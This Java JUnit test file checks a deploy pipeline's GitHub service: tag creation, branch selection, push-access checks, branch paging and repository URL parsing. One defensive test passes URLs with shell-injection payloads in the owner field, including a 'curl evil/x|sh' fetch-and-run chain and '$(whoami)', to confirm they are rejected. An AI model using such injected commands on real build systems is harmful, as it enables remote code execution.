package com.sails.ai.selfserviceapi.deploypipeline.github;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.method;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withStatus;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withSuccess;

import com.sails.ai.selfserviceapi.deploypipeline.config.PipelineProperties;
import java.time.Duration;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.RestClient;

class GitHubServiceTest {

    private static final String BASE = "https://api.github.com";
    private static final GitHubRepoRef REPO = new GitHubRepoRef("DurgaraoSails", "dummy-poc");
    private static final String TAG_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/refs";
    private static final String READ_TAG_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/tags/1.0.1";

    private static final String ALREADY_EXISTS = """
            {"message":"Reference already exists",
             "documentation_url":"https://docs.github.com/rest/git/refs#create-a-reference",
             "status":"422"}
            """;

    private MockRestServiceServer server;
    private GitHubService gitHubService;

    @BeforeEach
    void setUp() {
        RestClient.Builder builder = RestClient.builder().baseUrl(BASE);
        server = MockRestServiceServer.bindTo(builder).build();
        PipelineProperties properties = new PipelineProperties(
                "cloud-build", "self-service-builder", "ghp_test", false, false, Duration.ofMinutes(20), Duration.ofSeconds(10), null);
        gitHubService = new GitHubService(builder.build(), properties);
    }

    private static String tagPointingAt(String sha) {
        return """
                {"ref":"refs/tags/1.0.1","object":{"sha":"%s","type":"commit"}}
                """.formatted(sha);
    }

    @Test
    void aRetryOfAnAlreadyTaggedReleaseContinuesInsteadOfFailing() {
        server.expect(requestTo(TAG_URL)).andExpect(method(HttpMethod.POST))
                .andRespond(withStatus(HttpStatus.UNPROCESSABLE_ENTITY)
                        .body(ALREADY_EXISTS).contentType(MediaType.APPLICATION_JSON));
        server.expect(requestTo(READ_TAG_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(tagPointingAt("abc123"), MediaType.APPLICATION_JSON));

        assertThatCode(() -> gitHubService.createTagIfAbsent(REPO, "1.0.1", "abc123"))
                .doesNotThrowAnyException();

        server.verify();
    }

    @Test
    void aTagAlreadyPointingAtDifferentCodeStopsTheRelease() {
        server.expect(requestTo(TAG_URL)).andExpect(method(HttpMethod.POST))
                .andRespond(withStatus(HttpStatus.UNPROCESSABLE_ENTITY)
                        .body(ALREADY_EXISTS).contentType(MediaType.APPLICATION_JSON));
        server.expect(requestTo(READ_TAG_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(tagPointingAt("999999"), MediaType.APPLICATION_JSON));

        assertThatThrownBy(() -> gitHubService.createTagIfAbsent(REPO, "1.0.1", "abc123"))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("Refusing to reuse a version label");
    }

    @Test
    void someOther422SurfacesItsRealCauseRatherThanALookupFailure() {
        server.expect(requestTo(TAG_URL)).andExpect(method(HttpMethod.POST))
                .andRespond(withStatus(HttpStatus.UNPROCESSABLE_ENTITY)
                        .body("{\"message\":\"Object does not exist\"}")
                        .contentType(MediaType.APPLICATION_JSON));

        assertThatThrownBy(() -> gitHubService.createTagIfAbsent(REPO, "1.0.1", "deadbeef"))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("Object does not exist");

        server.verify();
    }

    @Test
    void aFreshTagIsCreatedWithoutAnyLookup() {
        server.expect(requestTo(TAG_URL)).andExpect(method(HttpMethod.POST))
                .andRespond(withSuccess(tagPointingAt("abc123"), MediaType.APPLICATION_JSON));

        assertThatCode(() -> gitHubService.createTagIfAbsent(REPO, "1.0.1", "abc123"))
                .doesNotThrowAnyException();

        server.verify();
    }

    @Test
    void refusesToDoAnythingWithNoTokenConfigured() {
        // SimpleClientHttpRequestFactory, not RestClient's JDK-HttpClient default: the default
        // opens a loopback socket for its async selector at build time (not first use), which
        // fails in some sandboxed/restricted-network environments. No request should ever
        // actually fire here — requireToken() throws first — but building the client must not.
        RestClient client = RestClient.builder().baseUrl(BASE)
                .requestFactory(new org.springframework.http.client.SimpleClientHttpRequestFactory())
                .build();
        PipelineProperties noToken = new PipelineProperties(
                "cloud-build", "self-service-builder", "", false, false, Duration.ofMinutes(20), Duration.ofSeconds(10), null);

        assertThatThrownBy(() -> new GitHubService(client, noToken).getDefaultBranch(REPO))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("No GitHub token configured");
    }

    @Test
    void parseRepoUrlHandlesTheDotGitSuffix() {
        GitHubRepoRef repo = gitHubService.parseRepoUrl("https://github.com/DurgaraoSails/dummy-poc.git");

        org.assertj.core.api.Assertions.assertThat(repo.owner()).isEqualTo("DurgaraoSails");
        org.assertj.core.api.Assertions.assertThat(repo.name()).isEqualTo("dummy-poc");
    }

    // --- which branch a version is cut from -------------------------------------------------

    private static final String REPO_URL = BASE + "/repos/DurgaraoSails/dummy-poc";
    private static final String MAIN_REF_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/main";
    private static final String DEVELOP_REF_URL = BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/develop";

    /**
     * A deploy-branch pin is a constructor argument, so these tests need their own service — and
     * therefore their own mock server. Returned together rather than reassigned onto the shared
     * fields: overwriting {@code server} while {@code gitHubService} still pointed at the one from
     * setUp would let an expectation land on one server while the request went to the other, which
     * passes without the call ever being made.
     */
    private record Deploying(GitHubService service, MockRestServiceServer server) {
    }

    private static Deploying deployingFrom(String deployBranch) {
        RestClient.Builder builder = RestClient.builder().baseUrl(BASE);
        MockRestServiceServer server = MockRestServiceServer.bindTo(builder).build();
        return new Deploying(new GitHubService(builder.build(), new PipelineProperties(
                "cloud-build", "self-service-builder", "ghp_test", false, false,
                Duration.ofMinutes(20), Duration.ofSeconds(10), deployBranch)), server);
    }

    private static String refPointingAt(String sha) {
        return """
                {"ref":"refs/heads/x","object":{"sha":"%s","type":"commit"}}
                """.formatted(sha);
    }

    /**
     * The default: follow whatever the repository itself calls its default branch. Two calls —
     * read the repo to learn the name, then read that branch's head.
     */
    @Test
    void cutsFromTheRepositoriesOwnDefaultBranchWhenNoBranchIsPinned() {
        Deploying deploying = deployingFrom(null);
        deploying.server().expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess("{\"default_branch\":\"develop\"}", MediaType.APPLICATION_JSON));
        deploying.server().expect(requestTo(DEVELOP_REF_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(refPointingAt("dev999"), MediaType.APPLICATION_JSON));

        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
                .isEqualTo("dev999");

        deploying.server().verify();
    }

    /**
     * Pinned: go straight to that branch. Notably it must NOT read the repo first — asking for the
     * default branch and then ignoring it would make a repo whose default is something else look
     * like it deployed from its default when it did not.
     */
    @Test
    void cutsFromThePinnedBranchWithoutConsultingTheRepositoriesDefault() {
        Deploying deploying = deployingFrom("main");
        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(refPointingAt("main111"), MediaType.APPLICATION_JSON));

        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
                .isEqualTo("main111");

        deploying.server().verify();
    }

    /**
     * A slashed branch name has to reach GitHub with its slash intact. Passed as a URI variable it
     * would be encoded to %2F, match no ref, and come back 404 — reported as "the branch does not
     * exist" about a branch that is right there.
     */
    @Test
    void keepsTheSlashInABranchNameInsteadOfEncodingIt() {
        Deploying deploying = deployingFrom("release/2024");
        deploying.server().expect(requestTo(BASE + "/repos/DurgaraoSails/dummy-poc/git/ref/heads/release/2024"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(refPointingAt("rel777"), MediaType.APPLICATION_JSON));

        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
                .isEqualTo("rel777");

        deploying.server().verify();
    }

    /** The failure this setting introduces: a repo that simply has no branch by that name. */
    @Test
    void saysWhichSettingIsAtFaultWhenThePinnedBranchDoesNotExist() {
        Deploying deploying = deployingFrom("main");
        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withStatus(HttpStatus.NOT_FOUND)
                        .body("{\"message\":\"Not Found\"}").contentType(MediaType.APPLICATION_JSON));

        assertThatThrownBy(() -> deploying.service().getDeployBranchHeadSha(REPO, null))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("Branch 'main' does not exist")
                .hasMessageContaining("pipeline.deploy-branch");
    }

    /**
     * Only a 404 means "no such branch". Anything else is a GitHub problem and must keep its own
     * message — the pinned path now reuses getBranchHeadSha, so this pins the one case it unwraps.
     */
    @Test
    void doesNotBlameThePinnedBranchForAGitHubFailureThatIsNotA404() {
        Deploying deploying = deployingFrom("main");
        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withStatus(HttpStatus.INTERNAL_SERVER_ERROR)
                        .body("{\"message\":\"Server Error\"}").contentType(MediaType.APPLICATION_JSON));

        assertThatThrownBy(() -> deploying.service().getDeployBranchHeadSha(REPO, null))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageNotContaining("does not exist")
                .hasMessageContaining("500");
    }

    /** Blank is the same as unset — the property is optional, not a required empty string. */
    @Test
    void treatsABlankPinnedBranchAsNotPinned() {
        Deploying deploying = deployingFrom("   ");
        deploying.server().expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess("{\"default_branch\":\"main\"}", MediaType.APPLICATION_JSON));
        deploying.server().expect(requestTo(MAIN_REF_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(refPointingAt("abc123"), MediaType.APPLICATION_JSON));

        org.assertj.core.api.Assertions.assertThat(deploying.service().getDeployBranchHeadSha(REPO, null))
                .isEqualTo("abc123");

        deploying.server().verify();
    }

    // --- push-access precondition ----------------------------------------------------------

    private void respondToRepoReadWith(String body) {
        server.expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(body, MediaType.APPLICATION_JSON));
    }

    @Test
    void allowsADeployWhenTheTokenCanPushToTheRepository() {
        respondToRepoReadWith("""
                {"default_branch":"main","permissions":{"admin":false,"push":true,"pull":true}}
                """);

        assertThatCode(() -> gitHubService.requirePushAccess(REPO)).doesNotThrowAnyException();

        server.verify();
    }

    /**
     * The case this precondition exists for: a public repository owned by someone else. It reads
     * fine — which is why the failure used to surface much later, as a 403 from the tag call.
     */
    @Test
    void refusesADeployWhenTheTokenCanOnlyReadTheRepository() {
        respondToRepoReadWith("""
                {"default_branch":"main","permissions":{"admin":false,"push":false,"pull":true}}
                """);

        assertThatThrownBy(() -> gitHubService.requirePushAccess(REPO))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("cannot push to")
                .hasMessageContaining("dummy-poc")
                .hasMessageContaining("release tag");

        server.verify();
    }

    /** A missing permissions block must not read as "allowed" — absence is not permission. */
    @Test
    void refusesADeployWhenTheResponseCarriesNoPermissionsAtAll() {
        respondToRepoReadWith("""
                {"default_branch":"main"}
                """);

        assertThatThrownBy(() -> gitHubService.requirePushAccess(REPO))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("cannot push to");

        server.verify();
    }

    /**
     * An archived repository is frozen read-only for everyone, yet still reports push: true — so
     * without this the deploy passes the precondition and fails later at the tag, with exactly the
     * raw 403 the precondition exists to replace.
     */
    @Test
    void refusesADeployToAnArchivedRepositoryEvenThoughItReportsPushAccess() {
        respondToRepoReadWith("""
                {"default_branch":"main","archived":true,"permissions":{"admin":true,"push":true,"pull":true}}
                """);

        assertThatThrownBy(() -> gitHubService.requirePushAccess(REPO))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("is archived")
                .hasMessageNotContaining("cannot push to");

        server.verify();
    }

    @Test
    void allowsADeployToAnActiveRepositoryThatSaysSoExplicitly() {
        respondToRepoReadWith("""
                {"default_branch":"main","archived":false,"permissions":{"admin":false,"push":true,"pull":true}}
                """);

        assertThatCode(() -> gitHubService.requirePushAccess(REPO)).doesNotThrowAnyException();

        server.verify();
    }

    /**
     * GitHub answers 404 rather than 403 for a private repo the token cannot see, so a typo'd URL
     * and an access problem arrive identically. The message has to cover both.
     */
    @Test
    void reportsAMissingOrInvisibleRepositoryDistinctlyFromAPushFailure() {
        server.expect(requestTo(REPO_URL)).andExpect(method(HttpMethod.GET))
                .andRespond(withStatus(HttpStatus.NOT_FOUND)
                        .body("{\"message\":\"Not Found\"}").contentType(MediaType.APPLICATION_JSON));

        assertThatThrownBy(() -> gitHubService.requirePushAccess(REPO))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("was not found, or is not visible")
                .hasMessageNotContaining("cannot push to");

        server.verify();
    }

    // --- listing branches for the deploy-branch picker ---------------------------------------

    private static String branchPage(int count, int startingAt) {
        StringBuilder json = new StringBuilder("[");
        for (int i = 0; i < count; i++) {
            if (i > 0) {
                json.append(',');
            }
            json.append("{\"name\":\"branch-").append(startingAt + i).append("\"}");
        }
        return json.append(']').toString();
    }

    private static String branchesUrl(int page) {
        return BASE + "/repos/DurgaraoSails/dummy-poc/branches?per_page=100&page=" + page;
    }

    /** The ordinary repository: one call, a short page, done. */
    @Test
    void readsEveryBranchInASingleCallWhenTheyFitOnOnePage() {
        server.expect(requestTo(branchesUrl(1))).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(
                        "[{\"name\":\"develop\"},{\"name\":\"main\"},{\"name\":\"release/2024\"}]",
                        MediaType.APPLICATION_JSON));

        GitHubBranches branches = gitHubService.listBranches(REPO);

        org.assertj.core.api.Assertions.assertThat(branches.names())
                .containsExactly("develop", "main", "release/2024");
        org.assertj.core.api.Assertions.assertThat(branches.truncated()).isFalse();

        server.verify();
    }

    /**
     * GitHub returns at most 100 at a time, so a repository with more would silently lose every
     * branch past the first hundred from the only UI that offers a choice.
     */
    @Test
    void keepsPagingWhileEachPageComesBackFull() {
        server.expect(requestTo(branchesUrl(1))).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(branchPage(100, 1), MediaType.APPLICATION_JSON));
        server.expect(requestTo(branchesUrl(2))).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess(branchPage(7, 101), MediaType.APPLICATION_JSON));

        GitHubBranches branches = gitHubService.listBranches(REPO);

        org.assertj.core.api.Assertions.assertThat(branches.names()).hasSize(107);
        org.assertj.core.api.Assertions.assertThat(branches.names().get(106)).isEqualTo("branch-107");
        org.assertj.core.api.Assertions.assertThat(branches.truncated()).isFalse();

        server.verify();
    }

    /**
     * A repository big enough to hit the page cap reports truncated, so the form can keep manual
     * entry open rather than presenting a partial list as if it were the whole choice.
     */
    @Test
    void stopsAtThePageCapAndSaysTheListIsIncomplete() {
        for (int page = 1; page <= 5; page++) {
            server.expect(requestTo(branchesUrl(page))).andExpect(method(HttpMethod.GET))
                    .andRespond(withSuccess(branchPage(100, 1 + (page - 1) * 100), MediaType.APPLICATION_JSON));
        }

        GitHubBranches branches = gitHubService.listBranches(REPO);

        org.assertj.core.api.Assertions.assertThat(branches.names()).hasSize(500);
        org.assertj.core.api.Assertions.assertThat(branches.truncated()).isTrue();

        server.verify();
    }

    /** A repository with no branches at all is empty, not truncated. */
    @Test
    void reportsAnEmptyRepositoryAsEmptyRatherThanTruncated() {
        server.expect(requestTo(branchesUrl(1))).andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess("[]", MediaType.APPLICATION_JSON));

        GitHubBranches branches = gitHubService.listBranches(REPO);

        org.assertj.core.api.Assertions.assertThat(branches.names()).isEmpty();
        org.assertj.core.api.Assertions.assertThat(branches.truncated()).isFalse();

        server.verify();
    }

    // --- what parseRepoUrl accepts ----------------------------------------------------------

    /**
     * The owner and name parsed here are interpolated into the Cloud Build clone step's shell
     * command, so the pattern is the boundary that keeps a metacharacter out of bash. It used to
     * accept anything but a slash in the owner position.
     */
    @Test
    void rejectsAnOwnerCarryingShellMetacharacters() {
        assertThatThrownBy(() -> gitHubService.parseRepoUrl("https://github.com/a;curl evil/x|sh;b/repo"))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("Not a recognizable GitHub repo URL");

        assertThatThrownBy(() -> gitHubService.parseRepoUrl("https://github.com/$(whoami)/repo"))
                .isInstanceOf(GitHubApiException.class)
                .hasMessageContaining("Not a recognizable GitHub repo URL");
    }

    /** Every shape that parsed before still parses — the tightening must not cost a real URL. */
    @Test
    void stillAcceptsEveryOrdinaryRepositoryUrl() {
        org.assertj.core.api.Assertions.assertThat(
                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent"))
                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
        org.assertj.core.api.Assertions.assertThat(
                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent.git"))
                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
        org.assertj.core.api.Assertions.assertThat(
                        gitHubService.parseRepoUrl("https://github.com/example-org/contract-agent/"))
                .isEqualTo(new GitHubRepoRef("example-org", "contract-agent"));
        org.assertj.core.api.Assertions.assertThat(
                        gitHubService.parseRepoUrl("git@github.com:example-org/poc_2024.git"))
                .isEqualTo(new GitHubRepoRef("example-org", "poc_2024"));
    }
}
